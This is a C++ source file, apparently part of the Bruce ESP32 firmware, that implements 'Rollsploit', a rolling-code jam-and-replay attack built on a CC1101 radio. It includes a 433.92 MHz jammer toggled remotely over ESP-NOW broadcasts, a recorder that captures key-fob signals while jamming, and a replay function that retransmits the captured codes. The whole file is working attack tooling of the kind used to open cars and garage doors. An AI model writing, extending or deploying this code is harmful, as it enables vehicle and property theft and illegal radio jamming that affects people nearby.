#include "rf_rollsploit.h"
#include "record.h"
#include <WiFi.h>
#include <esp_now.h>

bool jamming = false;
float rs_frequency = 433.92f;

void onReceive(const uint8_t *mac, const uint8_t *incomingData, int len) {
    String msg = "";
    for (int i = 0; i < len; i++) msg += (char)incomingData[i];
    jamming = (msg == "startjam") ? true : (msg == "stopjam") ? false : jamming;
}

void showStatus() {
    tft.fillScreen(TFT_BLACK);
    displayRedStripe(
        jamming ? "JAMMING" : "Waiting...", getComplementaryColor2(bruceConfig.priColor), bruceConfig.priColor
    );
}

void sendJamSignal(int pin) {
    for (int sequence = 1; sequence < 50; sequence++) {
        for (int duration = 1; duration <= 3; duration++) {
            if (check(EscPress)) return;
            for (int widthsize = 1; widthsize <= (1 + sequence); widthsize++) {
                digitalWrite(pin, HIGH);
                delayMicroseconds(10);
                digitalWrite(pin, LOW);
                delayMicroseconds(10);
            }
        }
    }
}

void rf_rollsploit_jam() {
    WiFi.mode(WIFI_STA);
    esp_now_init();
    esp_now_register_recv_cb(onReceive);

    int txPin = bruceConfigPins.CC1101_bus.io0;
    if (!initRfModule("tx", rs_frequency)) return;

    setMHZ(rs_frequency);

    while (true) {
        if (check(EscPress)) break;
        if (millis() % 500 < 20) showStatus();
        if (jamming) sendJamSignal(txPin);
    }

    deinitRfModule();
}

void rf_rollsploit_record(RawRecording &recorded, bool &returnToMenu) {
    uint8_t broadcastAddress[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    char *msg = "stopjam";

    RawRecordingStatus status;
    RingbufHandle_t rb;

    bool fakeRssiPresent = false;
    bool rssiFeature = false;
#ifdef USE_CC1101_VIA_SPI
    rssiFeature = bruceConfig.rfModule == CC1101_SPI_MODULE;
#endif

    tft.fillScreen(bruceConfig.bgColor);
    drawMainBorder();

    initRfModule("rx", rs_frequency);
    status.frequency = rs_frequency;
    if (status.frequency < 300) return;
    recorded.frequency = status.frequency;

    tft.drawPixel(0, 0, 0);
    tft.fillRect(10, 30, TFT_HEIGHT - 20, TFT_WIDTH - 40, bruceConfig.bgColor);

    delay(200);
    initRMT();
    rmt_get_ringbuf_handle(RMT_RX_CHANNEL, &rb);
    if (rb == NULL) return;
    rmt_rx_start(RMT_RX_CHANNEL, true);

    status.recordingFinished = false;
    delay(500);

    while (!status.recordingFinished) {
        previousMillis = millis();
        size_t rx_size = 0;
        rmt_item32_t *item = (rmt_item32_t *)xRingbufferReceive(rb, &rx_size, 0);

        if (item != nullptr) {
            size_t item_count = rx_size / sizeof(rmt_item32_t);
            if (item_count >= 5) {
                bool valid = true;
                rmt_item32_t *code = (rmt_item32_t *)malloc(rx_size);
                if (code != nullptr) {
                    memcpy(code, item, rx_size);
                    unsigned long long signalDuration = 0;
                    for (size_t i = 0; i < item_count; i++) {
                        if (code[i].duration1 > 10000) {
                            valid = false;
                            break;
                        }
                        signalDuration += code[i].duration0 + code[i].duration1;
                    }
                    if (valid) {
                        fakeRssiPresent = true;
                        recorded.codes.push_back(code);
                        recorded.codeLengths.push_back(item_count);

                        unsigned long receivedTime = millis();
                        if (status.lastSignalTime != 0) {
                            unsigned long signalDurationMs = signalDuration / RMT_1MS_TICKS;
                            uint16_t gap =
                                (uint16_t)(receivedTime - status.lastSignalTime - signalDurationMs);
                            recorded.gaps.push_back(gap);
                        } else {
                            status.firstSignalTime = receivedTime;
                            status.recordingStarted = true;
                            tft.drawPixel(0, 0, 0);
                            tft.fillRect(10, 30, TFT_HEIGHT - 20, TFT_WIDTH - 40, bruceConfig.bgColor);
                        }
                        status.lastSignalTime = receivedTime;
                    } else {
                        free(code);
                    }
                }
            }
            vRingbufferReturnItem(rb, (void *)item);
        }

        if (status.recordingStarted &&
            (status.lastRssiUpdate == 0 || millis() - status.lastRssiUpdate >= 100)) {
            if (fakeRssiPresent) status.latestRssi = -45;
            else status.latestRssi = -90;
#ifdef USE_CC1101_VIA_SPI
            if (rssiFeature) status.latestRssi = ELECHOUSE_cc1101.getRssi();
#endif
            status.rssiCount++;
            status.lastRssiUpdate = millis();
        }

        if (status.firstSignalTime > 0 && millis() - status.firstSignalTime >= 20000)
            status.recordingFinished = true;
        if (check(EscPress)) status.recordingFinished = true;

        if (status.latestRssi < 0 && millis() % 200 < 10) {
            displayRedStripe(
                String("Recording (" + String(jamming ? "JAM)" : "NO JAM)")),
                getComplementaryColor2(bruceConfig.priColor),
                bruceConfig.priColor
            );
        } else if (status.latestRssi >= 0) {
            displayRedStripe(
                String("Waiting for signal (" + String(jamming ? "JAM)" : "NO JAM)")),
                getComplementaryColor2(bruceConfig.priColor),
                bruceConfig.priColor
            );
        }

        if (check(SelPress)) {
            jamming = !jamming;
            msg = jamming ? (char *)"startjam" : (char *)"stopjam";
            esp_now_send(broadcastAddress, (uint8_t *)msg, strlen(msg));
        }
    }

    if (rmtInstalled) {
        rmt_rx_stop(RMT_RX_CHANNEL);
        deinitRMT();
    }
    deinitRfModule();
}

void rf_rollsploit_listen() {
    uint8_t broadcastAddress[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    WiFi.mode(WIFI_STA);
    esp_now_init();

    esp_now_peer_info_t peerInfo = {};
    memcpy(peerInfo.peer_addr, broadcastAddress, 6);
    peerInfo.channel = 1;
    peerInfo.encrypt = false;
    esp_now_add_peer(&peerInfo);

    tft.fillScreen(0);
    tft.setTextSize(2);
    tft.setCursor(5, 5);
    tft.setTextColor(TFT_WHITE);
    tft.println("[NEXT] Record");

    char *msg = "";

    while (true) {
        if (check(EscPress)) break;

        if (check(NextPress) || check(UpPress)) {
            RawRecording recording;
            recording.frequency = rs_frequency;
            bool rtm = false;
            rf_rollsploit_record(recording, rtm);

        replay_thing:
            while (true) {
                if (check(SelPress)) {
                    if (recording.codes.size() == 0 || recording.codeLengths.size() == 0) continue;
                    deinitRfModule();
                    if (!initRfModule("tx", recording.frequency)) continue;
                    rf_raw_emit(recording, rtm);
                    delay(50);
                    deinitRfModule();
                    if (!initRfModule("rx", recording.frequency)) continue;
                }

                if (check(NextPress)) {
                    jamming = !jamming;
                    msg = jamming ? (char *)"startjam" : (char *)"stopjam";
                    esp_now_send(broadcastAddress, (uint8_t *)msg, strlen(msg));
                }
                if (check(EscPress)) return;

                tft.fillScreen(0);
                tft.setTextSize(2);
                tft.setCursor(5, 5);
                tft.println(String("[OK] Replay"));
                tft.setCursor(5, 25);
                tft.println(String("[NEXT] Jammer (" + String(jamming ? "ON" : "OFF") + ")"));
                tft.setCursor(5, 45);
                tft.println("[ESC] Exit");

                delay(10);
            }
        }
    }
}

void selectFrequency() {
    options = {};
    int ind = 0;
    int size = sizeof(subghz_frequency_list) / sizeof(subghz_frequency_list[0]);

    for (int i = 0; i < size; i++) {
        String label = String(subghz_frequency_list[i], 2) + "Mhz";
        options.push_back({label.c_str(), [=]() { rs_frequency = subghz_frequency_list[i]; }});
    }

    loopOptions(options, ind);
    options.clear();
}

void rf_rollsploit() {
    if (bruceConfig.rfModule != CC1101_SPI_MODULE) {
        displayError("Rollsploit needs a CC1101!", true);
        return;
    }

    if (!initRfModule("rx", rs_frequency)) {
        displayError("CC1101 not found!", true);
        return;
    }

    deinitRfModule();

select:
    jamming = false;
    int option = 0;

    options = {
        {"Jammer",    [&]() { option = 1; }},
        {"Listener",  [&]() { option = 2; }},
        {"Frequency", [&]() { option = 4; }},
        {"Main Menu", [&]() { option = 3; }},
    };

    loopOptions(options);
    tft.fillScreen(0x0);

    if (option == 3) return;
    if (option == 1) {
        rf_rollsploit_jam();
        goto select;
    }
    if (option == 2) {
        rf_rollsploit_listen();
        goto select;
    }
    if (option == 4) {
        selectFrequency();
        goto select;
    }
}
